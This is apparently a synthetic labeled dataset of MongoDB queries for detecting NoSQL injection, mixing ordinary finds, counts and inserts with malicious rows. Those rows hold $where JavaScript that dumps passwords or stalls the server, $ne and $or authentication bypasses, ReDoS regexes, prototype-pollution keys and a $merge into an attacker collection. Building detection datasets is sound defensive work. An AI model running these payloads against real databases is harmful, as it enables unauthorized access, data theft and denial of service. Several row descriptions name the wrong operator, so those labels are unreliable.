id,label,type,collection,query,full_command,description,timestamp
2462,benign,count_query,logs,"{""category"": ""books""}","db.logs.countDocuments({""category"": ""books""})",Document count query,2025-11-24T21:15:54.471663
2463,malicious,where_injection,users,"{""$where"": ""this.password.match(/^a/)""}","db.users.find({""$where"": ""this.password.match(/^a/)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.289496
2464,benign,count_query,orders,"{""created_at"": {""$gte"": ""2025-11-19""}}","db.orders.countDocuments({""created_at"": {""$gte"": ""2025-11-19""}})",Document count query,2025-11-24T21:15:54.556723
2465,malicious,operator_injection,logs,"{""_id"": {""$ne"": null}}","db.logs.find({""_id"": {""$ne"": null}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.311213
2466,benign,simple_find,logs,"{""username"": ""yongding""}","db.logs.find({""username"": ""yongding""})",Simple field match query,2025-11-24T21:15:54.507677
2467,benign,simple_find,customers,"{""status"": ""inactive""}","db.customers.find({""status"": ""inactive""})",Simple field match query,2025-11-24T21:15:54.485779
2468,malicious,comment_injection,sessions,"{""username"": ""admin'--"", ""password"": ""anything""}","db.sessions.find({""username"": ""admin'--"", ""password"": ""anything""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.307342
2469,malicious,operator_injection,logs,"{""name"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.logs.find({""name"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $lte operator to bypass authentication or leak data,2025-11-24T21:15:54.331903
2470,malicious,operator_injection,orders,"{""username"": ""dakota84"", ""password"": {""$ne"": """"}}","db.orders.find({""username"": ""dakota84"", ""password"": {""$ne"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.350583
2471,benign,find_with_projection,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.435641
2472,benign,find_with_sort,customers,{},"db.customers.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.523014
2473,benign,aggregation_query,comments,"[{""$match"": {""status"": ""active""}}, {""$count"": ""total""}]","db.comments.aggregate([{""$match"": {""status"": ""active""}}, {""$count"": ""total""}])",Aggregation pipeline query,2025-11-24T21:15:54.368801
2474,benign,simple_find,customers,"{""name"": ""\u53f2\u6842\u9999""}","db.customers.find({""name"": ""\u53f2\u6842\u9999""})",Simple field match query,2025-11-24T21:15:54.520797
2475,malicious,operator_injection,logs,"{""username"": ""stanleydesiree"", ""password"": {""$ne"": """"}}","db.logs.find({""username"": ""stanleydesiree"", ""password"": {""$ne"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.342922
2476,malicious,where_injection,accounts,"{""$where"": ""db.users.find().forEach(function(u){print(u.password)})""}","db.accounts.find({""$where"": ""db.users.find().forEach(function(u){print(u.password)})""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.338368
2477,malicious,where_injection,orders,"{""$where"": ""db.users.find().forEach(function(u){print(u.password)})""}","db.orders.find({""$where"": ""db.users.find().forEach(function(u){print(u.password)})""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.297037
2478,benign,count_query,sessions,"{""status"": ""active""}","db.sessions.countDocuments({""status"": ""active""})",Document count query,2025-11-24T21:15:54.565269
2479,benign,insert_query,users,"{""username"": ""nabai"", ""email"": ""dinglei@example.net"", ""name"": ""\u80e1\u79c0\u73cd"", ""age"": 76, ""country"": ""Luxembourg"", ""created_at"": ""2025-06-25T02:53:44.955157"", ""status"": ""pending"", ""role"": ""moderator""}","db.users.insertOne({""username"": ""nabai"", ""email"": ""dinglei@example.net"", ""name"": ""\u80e1\u79c0\u73cd"", ""age"": 76, ""country"": ""Luxembourg"", ""created_at"": ""2025-06-25T02:53:44.955157"", ""status"": ""pending"", ""role"": ""moderator""})",Document insert operation,2025-11-24T21:15:54.426780
2480,benign,distinct_query,comments,"{""field"": ""role""}","db.comments.distinct(""role"")",Field distinct query,2025-11-24T21:15:54.396992
2481,benign,count_query,articles,"{""created_at"": {""$gte"": ""2025-11-11""}}","db.articles.countDocuments({""created_at"": {""$gte"": ""2025-11-11""}})",Document count query,2025-11-24T21:15:54.450154
2482,malicious,json_injection,customers,"{""username.__proto__.admin"": true}","db.customers.find({""username.__proto__.admin"": true})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.355733
2483,malicious,type_confusion,orders,"{""username"": []}","db.orders.find({""username"": []})",Exploiting type system for injection attack,2025-11-24T21:15:54.330185
2484,malicious,where_injection,products,"{""$where"": ""this.password.length > 0""}","db.products.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.306603
2485,benign,simple_find,logs,"{""email"": ""daltonkathleen@example.com""}","db.logs.find({""email"": ""daltonkathleen@example.com""})",Simple field match query,2025-11-24T21:15:54.453369
2486,benign,find_with_projection,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.493065
2487,malicious,where_injection,users,"{""$where"": ""this.username == 'admin'""}","db.users.find({""$where"": ""this.username == 'admin'""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.331137
2488,malicious,array_injection,users,"{""username"": {""$all"": [{""$elemMatch"": {""$gt"": """"}}]}}","db.users.find({""username"": {""$all"": [{""$elemMatch"": {""$gt"": """"}}]}})",Injection through array operators,2025-11-24T21:15:54.344188
2489,malicious,type_confusion,products,"{""admin"": {}}","db.products.find({""admin"": {}})",Exploiting type system for injection attack,2025-11-24T21:15:54.327884
2490,benign,count_query,users,"{""category"": ""books""}","db.users.countDocuments({""category"": ""books""})",Document count query,2025-11-24T21:15:54.448848
2491,benign,aggregation_query,users,"[{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}]","db.users.aggregate([{""$match"": {""price"": {""$gte"": 100}}}, {""$sort"": {""price"": -1}}, {""$limit"": 10}])",Aggregation pipeline query,2025-11-24T21:15:54.553457
2492,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(270).limit(92)",Query with pagination,2025-11-24T21:15:54.402997
2493,malicious,type_confusion,transactions,"{""user_id"": {}}","db.transactions.find({""user_id"": {}})",Exploiting type system for injection attack,2025-11-24T21:15:54.303589
2494,benign,update_query,orders,"{""filter"": {""_id"": ""d89c568d-5674-4177-9b08-725ee1eaf0f2""}, ""update"": {""$push"": {""tags"": ""\u7ba1\u7406""}}}","db.orders.updateOne({""_id"": ""d89c568d-5674-4177-9b08-725ee1eaf0f2""}, {""$push"": {""tags"": ""\u7ba1\u7406""}})",Document update operation,2025-11-24T21:15:54.434881
2495,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.393027
2496,malicious,json_injection,users,"{""username.__proto__.admin"": true}","db.users.find({""username.__proto__.admin"": true})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.336172
2497,malicious,json_injection,transactions,"{""constructor"": {""prototype"": {""admin"": true}}}","db.transactions.find({""constructor"": {""prototype"": {""admin"": true}}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.298257
2498,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.366597
2499,benign,find_with_limit,comments,"{""status"": ""active""}","db.comments.find({""status"": ""active""}).skip(293).limit(88)",Query with pagination,2025-11-24T21:15:54.484501
2500,benign,insert_query,products,"{""name"": ""Exclusive tangible archive"", ""price"": 993.44, ""category"": ""toys"", ""stock"": 790, ""rating"": 3.5, ""brand"": ""\u96e8\u6797\u6728\u98ce\u8ba1\u7b97\u673a\u4fe1\u606f\u6709\u9650\u516c\u53f8""}","db.products.insertOne({""name"": ""Exclusive tangible archive"", ""price"": 993.44, ""category"": ""toys"", ""stock"": 790, ""rating"": 3.5, ""brand"": ""\u96e8\u6797\u6728\u98ce\u8ba1\u7b97\u673a\u4fe1\u606f\u6709\u9650\u516c\u53f8""})",Document insert operation,2025-11-24T21:15:54.511735
2501,malicious,or_injection,transactions,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.transactions.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.314883
2502,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.444866
2503,malicious,or_injection,customers,"{""$or"": [{""username"": ""admin""}, {""1"": ""1""}]}","db.customers.find({""$or"": [{""username"": ""admin""}, {""1"": ""1""}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.315302
2504,malicious,type_confusion,users,"{""admin"": []}","db.users.find({""admin"": []})",Exploiting type system for injection attack,2025-11-24T21:15:54.325088
2505,malicious,operator_injection,customers,"{""user_id"": {""$exists"": true, ""$ne"": null}}","db.customers.find({""user_id"": {""$exists"": true, ""$ne"": null}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.299862
2506,benign,aggregation_query,customers,"[{""$match"": {""created_at"": {""$gte"": ""2025-11-03""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}]","db.customers.aggregate([{""$match"": {""created_at"": {""$gte"": ""2025-11-03""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.520403
2507,malicious,regex_injection,logs,"{""token"": {""$regex"": "".{1,1000000}""}}","db.logs.find({""token"": {""$regex"": "".{1,1000000}""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.320117
2508,malicious,where_injection,users,"{""$where"": ""this.username == 'admin'""}","db.users.find({""$where"": ""this.username == 'admin'""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.297219
2509,benign,find_with_projection,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.497769
2510,benign,find_with_sort,customers,{},"db.customers.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.487101
2511,benign,count_query,products,"{""category"": ""electronics""}","db.products.countDocuments({""category"": ""electronics""})",Document count query,2025-11-24T21:15:54.556090
2512,malicious,operator_injection,products,"{""_id"": {""$ne"": null}}","db.products.find({""_id"": {""$ne"": null}})",Using $ne operator to bypass authentication or leak data,2025-11-24T21:15:54.312687
2513,malicious,operator_injection,users,"{""username"": ""wei03"", ""password"": {""$ne"": """"}}","db.users.find({""username"": ""wei03"", ""password"": {""$ne"": """"}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.350252
2514,malicious,regex_injection,transactions,"{""id"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}}","db.transactions.find({""id"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.289776
2515,malicious,operator_injection,users,"{""user_id"": {""$regex"": "".*""}}","db.users.find({""user_id"": {""$regex"": "".*""}})",Using $ne operator to bypass authentication or leak data,2025-11-24T21:15:54.310572
2516,benign,find_with_sort,products,{},"db.products.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.508009
2517,malicious,array_injection,orders,"{""status"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}}","db.orders.find({""status"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}})",Injection through array operators,2025-11-24T21:15:54.353034
2518,benign,insert_query,orders,"{""order_id"": ""050aa77b-3f0b-449b-b8a8-1aaae455f625"", ""user_id"": ""3fa11c73-5723-48eb-86f8-d2033b816a01"", ""total"": 1553.34, ""status"": ""delivered"", ""created_at"": ""2025-11-02T04:56:05.144095"", ""items_count"": 12}","db.orders.insertOne({""order_id"": ""050aa77b-3f0b-449b-b8a8-1aaae455f625"", ""user_id"": ""3fa11c73-5723-48eb-86f8-d2033b816a01"", ""total"": 1553.34, ""status"": ""delivered"", ""created_at"": ""2025-11-02T04:56:05.144095"", ""items_count"": 12})",Document insert operation,2025-11-24T21:15:54.514064
2519,benign,count_query,products,"{""created_at"": {""$gte"": ""2025-11-01""}}","db.products.countDocuments({""created_at"": {""$gte"": ""2025-11-01""}})",Document count query,2025-11-24T21:15:54.539253
2520,benign,find_with_projection,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.388895
2521,malicious,array_injection,transactions,"{""id"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}}","db.transactions.find({""id"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}})",Injection through array operators,2025-11-24T21:15:54.295919
2522,benign,find_with_projection,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.557666
2523,benign,simple_find,users,"{""role"": ""user""}","db.users.find({""role"": ""user""})",Simple field match query,2025-11-24T21:15:54.413524
2524,benign,count_query,articles,"{""status"": ""active""}","db.articles.countDocuments({""status"": ""active""})",Document count query,2025-11-24T21:15:54.401861
2525,benign,find_with_projection,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.375457
2526,benign,find_with_limit,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}).skip(4).limit(100)",Query with pagination,2025-11-24T21:15:54.566756
2527,benign,find_with_projection,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.381194
2528,malicious,regex_injection,accounts,"{""role"": {""$regex"": ""admin.*"", ""$options"": ""i""}}","db.accounts.find({""role"": {""$regex"": ""admin.*"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.324610
2529,malicious,aggregation_injection,customers,"[{""$redact"": {""$cond"": {""if"": true, ""then"": ""$$DESCEND"", ""else"": ""$$PRUNE""}}}]","db.customers.aggregate([{""$redact"": {""$cond"": {""if"": true, ""then"": ""$$DESCEND"", ""else"": ""$$PRUNE""}}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.355250
2530,benign,insert_query,products,"{""name"": ""Adaptive composite concept"", ""price"": 510.71, ""category"": ""books"", ""stock"": 310, ""rating"": 2.6, ""brand"": ""\u4fe1\u8bda\u81f4\u8fdc\u4fe1\u606f\u6709\u9650\u516c\u53f8""}","db.products.insertOne({""name"": ""Adaptive composite concept"", ""price"": 510.71, ""category"": ""books"", ""stock"": 310, ""rating"": 2.6, ""brand"": ""\u4fe1\u8bda\u81f4\u8fdc\u4fe1\u606f\u6709\u9650\u516c\u53f8""})",Document insert operation,2025-11-24T21:15:54.549575
2531,malicious,where_injection,logs,"{""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""}","db.logs.find({""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.288944
2532,malicious,or_injection,users,"{""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]}","db.users.find({""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.340323
2533,benign,find_with_projection,logs,"{""status"": ""active""}","db.logs.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.414225
2534,benign,simple_find,articles,"{""username"": ""xiulan41""}","db.articles.find({""username"": ""xiulan41""})",Simple field match query,2025-11-24T21:15:54.415707
2535,malicious,array_injection,products,"{""role.0"": {""$exists"": true}}","db.products.find({""role.0"": {""$exists"": true}})",Injection through array operators,2025-11-24T21:15:54.324892
2536,benign,find_with_sort,comments,{},"db.comments.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.365842
2537,malicious,where_injection,orders,"{""$where"": ""sleep(5000)""}","db.orders.find({""$where"": ""sleep(5000)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.343400
2538,benign,update_query,orders,"{""filter"": {""_id"": ""b069acba-8d9b-4935-9af3-80a4ef70f8b6""}, ""update"": {""$set"": {""status"": ""active""}}}","db.orders.updateOne({""_id"": ""b069acba-8d9b-4935-9af3-80a4ef70f8b6""}, {""$set"": {""status"": ""active""}})",Document update operation,2025-11-24T21:15:54.456896
2539,malicious,operator_injection,transactions,"{""id"": {""$exists"": true, ""$ne"": null}}","db.transactions.find({""id"": {""$exists"": true, ""$ne"": null}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.344778
2540,malicious,comment_injection,logs,"{""username"": ""admin'--"", ""password"": ""anything""}","db.logs.find({""username"": ""admin'--"", ""password"": ""anything""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.343227
2541,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(228).limit(69)",Query with pagination,2025-11-24T21:15:54.485070
2542,benign,simple_find,customers,"{""category"": ""clothing""}","db.customers.find({""category"": ""clothing""})",Simple field match query,2025-11-24T21:15:54.393948
2543,benign,aggregation_query,users,"[{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}]","db.users.aggregate([{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}])",Aggregation pipeline query,2025-11-24T21:15:54.436031
2544,malicious,type_confusion,products,"{""username"": {""$not"": {""$type"": 10}}}","db.products.find({""username"": {""$not"": {""$type"": 10}}})",Exploiting type system for injection attack,2025-11-24T21:15:54.359388
2545,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.546986
2546,benign,find_with_limit,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}).skip(221).limit(32)",Query with pagination,2025-11-24T21:15:54.515007
2547,malicious,regex_injection,users,"{""email"": {""$regex"": "".{1,1000000}""}}","db.users.find({""email"": {""$regex"": "".{1,1000000}""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.319336
2548,malicious,or_injection,orders,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.orders.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.340821
2549,malicious,or_injection,logs,"{""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]}","db.logs.find({""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.336742
2550,benign,insert_query,orders,"{""order_id"": ""960a035c-0786-4459-8f89-321cff4ca29e"", ""user_id"": ""1cacfd9f-6a3e-4d4f-8754-7e4d55a79731"", ""total"": 2145.78, ""status"": ""pending"", ""created_at"": ""2025-11-21T00:09:53.655993"", ""items_count"": 12}","db.orders.insertOne({""order_id"": ""960a035c-0786-4459-8f89-321cff4ca29e"", ""user_id"": ""1cacfd9f-6a3e-4d4f-8754-7e4d55a79731"", ""total"": 2145.78, ""status"": ""pending"", ""created_at"": ""2025-11-21T00:09:53.655993"", ""items_count"": 12})",Document insert operation,2025-11-24T21:15:54.431779
2551,benign,count_query,orders,{},db.orders.countDocuments({}),Document count query,2025-11-24T21:15:54.538903
2552,malicious,array_injection,orders,"{""status"": {""$size"": {""$gt"": 0}}}","db.orders.find({""status"": {""$size"": {""$gt"": 0}}})",Injection through array operators,2025-11-24T21:15:54.311907
2553,malicious,operator_injection,products,"{""_id"": {""$ne"": null}}","db.products.find({""_id"": {""$ne"": null}})",Using $nin operator to bypass authentication or leak data,2025-11-24T21:15:54.355111
2554,benign,distinct_query,articles,"{""field"": ""role""}","db.articles.distinct(""role"")",Field distinct query,2025-11-24T21:15:54.522485
2555,malicious,operator_injection,accounts,"{""role"": {""$exists"": true, ""$ne"": null}}","db.accounts.find({""role"": {""$exists"": true, ""$ne"": null}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.344688
2556,malicious,type_confusion,sessions,"{""password"": {""$not"": {""$type"": 10}}}","db.sessions.find({""password"": {""$not"": {""$type"": 10}}})",Exploiting type system for injection attack,2025-11-24T21:15:54.341513
2557,benign,simple_find,orders,"{""country"": ""\u5229\u6bd4\u4e9a""}","db.orders.find({""country"": ""\u5229\u6bd4\u4e9a""})",Simple field match query,2025-11-24T21:15:54.563403
2558,benign,aggregation_query,comments,"[{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}]","db.comments.aggregate([{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}])",Aggregation pipeline query,2025-11-24T21:15:54.483683
2559,malicious,where_injection,orders,"{""$where"": ""this.password.length > 0""}","db.orders.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.352351
2560,malicious,aggregation_injection,accounts,"[{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}]","db.accounts.aggregate([{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.338932
2561,malicious,operator_injection,products,"{""_id"": {""$ne"": null}}","db.products.find({""_id"": {""$ne"": null}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.355443
2562,benign,update_query,users,"{""filter"": {""_id"": ""48f63a9e-9371-4e14-8d7e-2e139cd928ef""}, ""update"": {""$push"": {""tags"": ""watch""}}}","db.users.updateOne({""_id"": ""48f63a9e-9371-4e14-8d7e-2e139cd928ef""}, {""$push"": {""tags"": ""watch""}})",Document update operation,2025-11-24T21:15:54.500655
2563,malicious,operator_injection,products,"{""_id"": {""$ne"": null}}","db.products.find({""_id"": {""$ne"": null}})",Using $gt operator to bypass authentication or leak data,2025-11-24T21:15:54.312049
2564,malicious,json_injection,products,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.products.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.304221
2565,malicious,comment_injection,transactions,"{""$comment"": ""/*"", ""username"": ""*/admin""}","db.transactions.find({""$comment"": ""/*"", ""username"": ""*/admin""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.358367
2566,benign,find_with_sort,logs,{},"db.logs.find({}).sort({""created_at"": -1})",Query with sorting,2025-11-24T21:15:54.501324
2567,benign,count_query,users,"{""category"": ""books""}","db.users.countDocuments({""category"": ""books""})",Document count query,2025-11-24T21:15:54.525635
2568,malicious,json_injection,orders,"{""constructor"": {""prototype"": {""admin"": true}}}","db.orders.find({""constructor"": {""prototype"": {""admin"": true}}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.315285
2569,benign,find_with_limit,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}).skip(331).limit(41)",Query with pagination,2025-11-24T21:15:54.416310
2570,malicious,operator_injection,products,"{""username"": {""$exists"": true, ""$ne"": null}}","db.products.find({""username"": {""$exists"": true, ""$ne"": null}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.343012
2571,malicious,where_injection,accounts,"{""$where"": ""this.password.length > 0""}","db.accounts.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.291519
2572,malicious,where_injection,orders,"{""$where"": ""function() { var x = this.password; return x.match(/.*/) }""}","db.orders.find({""$where"": ""function() { var x = this.password; return x.match(/.*/) }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.335826
2573,benign,aggregation_query,comments,"[{""$match"": {""created_at"": {""$gte"": ""2025-11-12""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}]","db.comments.aggregate([{""$match"": {""created_at"": {""$gte"": ""2025-11-12""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.395838
2574,benign,aggregation_query,sessions,"[{""$match"": {""status"": ""active""}}, {""$count"": ""total""}]","db.sessions.aggregate([{""$match"": {""status"": ""active""}}, {""$count"": ""total""}])",Aggregation pipeline query,2025-11-24T21:15:54.442864
2575,malicious,operator_injection,sessions,"{""admin"": {""$eq"": true}}","db.sessions.find({""admin"": {""$eq"": true}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.296968
2576,benign,delete_query,sessions,"{""_id"": ""48164644-01a9-4bd0-ad71-d8749dc3a0c6""}","db.sessions.deleteOne({""_id"": ""48164644-01a9-4bd0-ad71-d8749dc3a0c6""})",Document delete operation,2025-11-24T21:15:54.447461
2577,malicious,or_injection,orders,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.orders.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.357565
2578,malicious,array_injection,logs,"{""user_id"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}}","db.logs.find({""user_id"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}})",Injection through array operators,2025-11-24T21:15:54.307455
2579,benign,simple_find,logs,"{""country"": ""\u897f\u8428\u6469\u4e9a""}","db.logs.find({""country"": ""\u897f\u8428\u6469\u4e9a""})",Simple field match query,2025-11-24T21:15:54.558069
2580,malicious,or_injection,users,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.users.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.359847
2581,benign,find_with_limit,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}).skip(288).limit(26)",Query with pagination,2025-11-24T21:15:54.564689
2582,malicious,operator_injection,orders,"{""admin"": {""$eq"": true}}","db.orders.find({""admin"": {""$eq"": true}})",Using $nin operator to bypass authentication or leak data,2025-11-24T21:15:54.333999
2583,malicious,array_injection,transactions,"{""name"": {""$elemMatch"": {""$exists"": true}}}","db.transactions.find({""name"": {""$elemMatch"": {""$exists"": true}}})",Injection through array operators,2025-11-24T21:15:54.329781
2584,malicious,regex_injection,customers,"{""id"": {""$regex"": ""^.*$"", ""$options"": ""s""}}","db.customers.find({""id"": {""$regex"": ""^.*$"", ""$options"": ""s""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.308728
2585,malicious,or_injection,logs,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.logs.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.346701
2586,malicious,array_injection,customers,"{""role"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}}","db.customers.find({""role"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}})",Injection through array operators,2025-11-24T21:15:54.294644
2587,malicious,or_injection,logs,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.logs.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.338116
